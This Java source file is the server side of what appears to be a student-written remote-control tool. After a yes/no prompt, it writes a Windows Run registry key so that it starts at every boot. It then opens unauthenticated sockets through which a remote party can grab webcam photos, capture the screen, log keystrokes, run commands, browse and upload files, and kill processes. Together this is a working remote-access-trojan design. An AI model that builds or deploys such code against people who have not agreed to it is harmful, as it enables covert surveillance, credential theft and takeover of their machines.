package server;

import javax.swing.*;
import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;
import java.nio.charset.Charset;
import java.util.ArrayList;

public class ServerApplication {
    private static int port_file = 6666;
    private static int port_proc = 6667;
    private static int port_camera = 6668;
    private static int port_uploarFile = 6669;
    private static int port_cmd = 7888;
    private static int port_screenMonitor = 8000;// 各个线程的端口设置

    private static int port_Interaction=7000;

    public static void main(String[]args)throws IOException{
        int res = JOptionPane.showConfirmDialog(null,
                "Do you want to be controlled?", "远程控制",
                JOptionPane.YES_NO_OPTION);
        if (res == JOptionPane.YES_OPTION) {
            System.out.println("选择是后执行的代码"); // 点击“是”后执行这个代码块
            //AutoRun auto_run=new AutoRun(); //加入自启动
            try{
                AutoRun();  //一个自动执行的方法为什么之前定义成类?
            }catch (Exception e){
                JOptionPane.showMessageDialog(null,"错误,未能执行自动运行!", "错误",JOptionPane.ERROR_MESSAGE);
            }
        } else {
            System.out.println("选择否后执行的代码"); // 点击“否”后执行这个代码块
            System.exit(1);
            return;
        }
        ServerSocket CommandInteraction=new ServerSocket(port_Interaction);
        Socket getCommandNumberStream=CommandInteraction.accept();
        InputStream commandNumberStream=getCommandNumberStream.getInputStream();
        /** commandNumer
         * -1: 终止程序
         * 1 : 开启摄像头录制
         * 2 : CMDos
         * 3 :
         * */
        final Object someObject=new Object();
        while(true){
            int commandNumber=commandNumberStream.read();
            if(commandNumber==-1){
                break;
            }else{
                switch (commandNumber){
                    case 1: //Camera
                        Thread myServerCamera=new Thread(){
                            public void run(){
                                synchronized (someObject){
                                    try{
                                        Flag.setFlag(true);//设置开始工作
                                        GetCamera.CapturePhoto();
                                    }catch (Exception e){
                                        e.printStackTrace();
                                    }
                                };

                                try{
                                    Thread.sleep(200);
                                }catch (InterruptedException e){
                                    e.printStackTrace();
                                }
                            }
                        };
                        myServerCamera.start();
                        break;
                    case 2: //cmd
                        Thread myServerCmd=new Thread(){
                            public void run(){
                                synchronized (someObject){
                                    try{
                                        Flag.setFlag(true);
                                        ServerCmd.sendResult();
                                    }catch (Exception e){
                                        e.printStackTrace();
                                    }
                                };
                                try{
                                    Thread.sleep(100);
                                }catch (InterruptedException e){
                                    e.printStackTrace();
                                }
                            }
                        };
                        myServerCmd.start();
                        break;
                    case 3: //File
                        Thread myServerFileManager=new Thread() {
                            public void run(){
                                synchronized ((someObject)){
                                    try{
                                        Flag.setFlag(true);
                                        ServerAppFileManager fileManager=new ServerAppFileManager();
                                        fileManager.serverGetRootFile();
                                        fileManager.setPort(port_file);
                                        fileManager.serverFileSocketManager();
                                    }catch (Exception e){
                                        e.printStackTrace();
                                    };
                                    try{
                                        Thread.sleep(100);
                                    }catch (InterruptedException e){
                                        e.printStackTrace();
                                    };
                                };
                            };
                        };
                        myServerFileManager.start();
                        break;
                    case 4: //proc
                        Thread myServerProcMananger=new Thread(){
                            public void run(){
                                synchronized (someObject){
                                    try{
                                        Flag.setFlag(true);
                                        ServerAppProcManager procManager=new ServerAppProcManager();
                                        procManager.setPort(port_proc);
                                        procManager.serverProcSocketManager();
                                    }catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                            };
                        };
                        myServerProcMananger.start();
                        break;
                    case 5: //screen Monitor
                        Thread myServerScreenMonitor=new Thread(){
                            public void run() {
                                synchronized (someObject) {
                                    try {
                                        Flag.setFlag(true);
                                        ServerScreenMonitor.screenCapture();
                                        ServerScreenMonitor.send();
                                    } catch (Exception e) {
                                        e.printStackTrace();
                                    }
                                }
                            }
                        };
                        myServerScreenMonitor.start();
                        break;
                    case 6: //upload File
                        Thread myServerUploadFile=new Thread(){
                            public void run(){
                                synchronized (someObject){
                                    ServerAppFileReceive fileReceive=new ServerAppFileReceive();
                                    fileReceive.setPort(port_uploarFile);
                                    try{
                                        Flag.setFlag(true);
                                        fileReceive.receive();
                                    }catch (Exception e){
                                        e.printStackTrace();
                                    }
                                }
                            }
                        };
                        myServerUploadFile.start();
                        break;
                    case 7: //keyboard Monitor
                        send_keybord mySend_keybord=new send_keybord();
                        mySend_keybord.setport(8886);
                        Flag.setFlag(true);
                        new Thread(mySend_keybord).start();
                        break;
                }
            }
        }
        Flag.setFlag(false);
        commandNumberStream.close();
        getCommandNumberStream.close();
        CommandInteraction.close();
    }
    // Server自动运行设置方法
    public static void AutoRun() throws IOException{
        System.out.println("将加本文件加入自启动："+"server.jar");
        String name="server.jar";
        File file=new File(".");
        String path=path=file.getCanonicalPath()+"/";
        System.out.println(path);
        String regKey = "\"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\"";//??为什么要用\\表示路径,迷了
        Runtime.getRuntime().exec("reg "+"add "+regKey+" /v "+name+" /t reg_sz /d "+path);
    }
}

class ServerAppFileManager {
    public ArrayList<String> fileDirectory_list = new ArrayList<String>();
    public ArrayList<String> file_list = new ArrayList<String>();
    public int port;
    public static String route;

    public void setPort(int port) {//??匪夷所思,何必呢
        this.port = port;
    }

    public void serverGetRootFile() {
        this.fileDirectory_list = new ArrayList<String>();
        this.file_list = new ArrayList<String>();
        File[] root = File.listRoots();

        for (File file : root) {
            this.fileDirectory_list.add(file.getAbsolutePath().toString());
        }
        System.out.println(fileDirectory_list);

    }

    public void serverGetFileName() {
        this.fileDirectory_list = new ArrayList<String>();
        this.file_list = new ArrayList<String>();

        File fileDirectory = new File(route);
        File[] aa = fileDirectory.listFiles();

        for (int i = 0; i < aa.length; i++) {
            if (aa[i].isDirectory()) {
                this.fileDirectory_list.add(aa[i].toString());
            }
        }// 逐一读取目录
        this.fileDirectory_list.sort(null);// 对得到的目录排序

        File file = new File(route);
        File[] bb = file.listFiles();
        for (int j = 0; j < bb.length; j++) {
            if (bb[j].isFile()) {
                this.file_list.add(bb[j].toString());
            }
        }// 逐一读取文件
        this.file_list.sort(null);// 对得到的文件排序
    }

    public void serverFileSocketManager() {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (Flag.isWorking) {
                try {
                    System.out.println("等待远程连接，端口号为："
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("远程主机地址："
                            + server.getRemoteSocketAddress());
                    DataInputStream in = new DataInputStream(
                            server.getInputStream());
                    String cache = in.readUTF().toString();
                    if (cache.equals("File_check")) {
                        serverGetRootFile();
                        System.out.println(this.fileDirectory_list + "22222");
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        fileDirectory_list.addAll(file_list);
                        out.writeObject(this.fileDirectory_list);
                    } else {
                        route = cache;
                        //server_getFileName();
                        serverGetFileName();
                        System.out.println(this.fileDirectory_list + "22222");
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        fileDirectory_list.addAll(file_list);
                        out.writeObject(this.fileDirectory_list);
                    }
                    serverSocket.setSoTimeout(300000);
                    server.close(); //糟糕的关闭模式
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }
}

class ServerAppProcManager {
    public ArrayList<String[]> proc_list = new ArrayList<String[]>();
    public int port;

    public void setPort(int port) {
        this.port = port;
    }

    public void serverGetProcName() {
        try {
            // 先清空成员变量
            proc_list = new ArrayList<String[]>();

            // 先创建系统进程
            ProcessBuilder pb = new ProcessBuilder("tasklist");
            Process p = null;
            p = pb.start();
            BufferedReader out = new BufferedReader(new InputStreamReader(
                    new BufferedInputStream(p.getInputStream()),
                    Charset.forName("GB2312")));
            BufferedReader err = new BufferedReader(new InputStreamReader(
                    new BufferedInputStream(p.getErrorStream())));
            System.out.println("Window 系统进程列表");
            String ostr;

            // 输出本地进程
            int line = 0;
            while ((ostr = out.readLine()) != null) {
                if (line != 2 && line != 3)// 去除第二、三行的不需要部分
                {

                    String[] cacheStrings = ostr.split("\\s{1,}", 5); // 第一行为表格头部，用一个空格分割
                    this.proc_list.add(cacheStrings);

                }
                line++;
            }
            this.proc_list.remove(0);// 去除第一个不必要的元素
            String estr = null;

            // 如果有，则输出错误信息
            try {
                estr = err.readLine();
            } catch (IOException e) {
                // TODO Auto-generated catch block
                e.printStackTrace();
            }
            if (estr != null) {
                System.out.println("\nError Info");
                System.out.println(estr);
            }
        } catch (IOException e) {
            // TODO Auto-generated catch block
            e.printStackTrace();
        }
    }

    public void serverProcSocketManager() {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (Flag.isWorking) {
                try {
                    System.out.println("等待远程连接，端口号为："
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("远程主机地址："
                            + server.getRemoteSocketAddress());
                    DataInputStream in = new DataInputStream(
                            server.getInputStream());
                    String cache = in.readUTF().toString();
                    /* 刷新操作 */
                    if (cache.equals("refresh")) {
                        //server_getProcName();// 先再次获取本地进程，刷新数据
                        serverGetProcName();
                        // 将数据传输给对方
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());
                        out.writeObject(this.proc_list);
                    }
                    /* 刷新操作 */
                    /* 删除操作 */
                    else {
                        ObjectOutputStream out = new ObjectOutputStream(
                                server.getOutputStream());

                        Process process = null;
                        BufferedReader reader = null;
                        try { // 杀掉进程 process =

                            Runtime.getRuntime().exec(
                                    "taskkill /F /PID " + cache);
                            out.writeObject("200");
                        } catch (Exception e) {
                            e.printStackTrace();
                        } finally {
                            if (process != null) {
                                process.destroy();
                            }
                            if (reader != null) {
                                try {
                                    reader.close();
                                } catch (IOException e) {
                                    e.printStackTrace();
                                }
                            }
                        }
                        System.out.println(cache);
                    }
                    /* 删除操作 */
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }
}

class ServerAppFileReceive {
    public String directory = "";
    public File file;
    public int port;
    public int count = 0;

    public void setPort(int port) {
        this.port = port;
    }

    public void receive() throws ClassNotFoundException {
        ServerSocket serverSocket = null;
        try {
            serverSocket = new ServerSocket(port);
            serverSocket.setSoTimeout(300000);
        } catch (IOException e1) {
            // TODO Auto-generated catch block
            e1.printStackTrace();
        }
        if (serverSocket != null) {
            while (Flag.isWorking) {
                try {
                    File cache = new File(ServerFileManager.route + count);
                    while (cache.exists() && cache.isFile()) {
                        count = count + 1;
                        cache = new File(ServerFileManager.route + count);
                    }
                    System.out.println("等待远程连接，端口号为："
                            + serverSocket.getLocalPort() + "...");
                    Socket server = serverSocket.accept();
                    System.out.println("远程主机地址："
                            + server.getRemoteSocketAddress());
                    InputStream in = server.getInputStream();
                    FileOutputStream fos = new FileOutputStream(ServerFileManager.route + count);
                    int len;
                    byte[] bs = new byte[1024];
                    while ((len = in.read(bs)) != -1) {
                        fos.write(bs, 0, len);
                    }
                    OutputStream out = server.getOutputStream();
                    fos.close();
                    in.close();
                    out.close();
                    serverSocket.setSoTimeout(300000);
                    server.close();
                } catch (SocketTimeoutException s) {
                    System.out.println("Socket timed out!");
                    break;
                } catch (IOException e) {
                    e.printStackTrace();
                    break;
                }
            }
        }
    }
}




/**
 * 这有必要搞个类吗?
 * */

/*
class CameraManager {
    //没有用到为什么要定义一个？
    public ArrayList<String[]> proc_list = new ArrayList<String[]>();
    public int port;
    public int picNum;

    public void setPort(int port) {
        this.port = port;
    }
    public void serverCameraRecord() {
        try {
            Flag.setFlag(true);
            GetCamera.CapturePhoto();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}*/
